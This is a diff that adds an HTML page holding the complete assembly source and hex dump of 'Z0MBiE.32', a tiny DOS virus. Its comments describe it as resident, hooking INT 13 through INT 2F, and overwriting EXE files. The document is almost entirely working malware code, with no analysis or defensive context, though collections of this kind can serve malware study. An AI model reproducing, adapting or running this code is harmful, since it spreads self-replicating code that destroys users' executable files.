@@ -1,0 +1,60 @@
+<html>
+<body bgcolor=#FFFFFF text=#000000>
+<pre>
+
+; Z0MBiE.32
+
+; - 32-byte length
+; - resident, hooks INT 13 via INT 2F
+; - EXE-overwriting
+
+; - DOS-only
+; - very unstable
+
+; EXECUTABLE:
+
+; CODE:
+;
+;   0100  B4 13 CD 2F 0E 1F BA 14-01 06 53 66 8F 06 20 01
+;   0110  CD 2F CD 27 26 80 3F 4D-75 05 0E 07 BB 00 01 EA
+
+; SOURCE:
+                        model   tiny
+                        p386
+                        codeseg
+
+                        org     100h
+start:
+                        mov     ah, 13h
+                        int     2Fh
+
+                        push    cs
+                        pop     ds
+                        lea     dx, int13
+
+                        push    es
+                        push    bx
+
+                        pop     dword ptr old13
+                      ; pop     dword ptr [edx+old13-int13]
+
+                        int     2Fh
+
+                      ; xchg    dx, ax
+                        int     27h
+
+int13:                ; cmp     ah, 03h
+                      ; jne     exit13
+
+                        cmp     byte ptr es:[bx], 'M'
+                        jne     exit13
+
+                        push    cs
+                        pop     es
+                        lea     bx, start
+
+exit13:                 db      0EAh
+
+old13                   dd      ?
+
+                        end     start
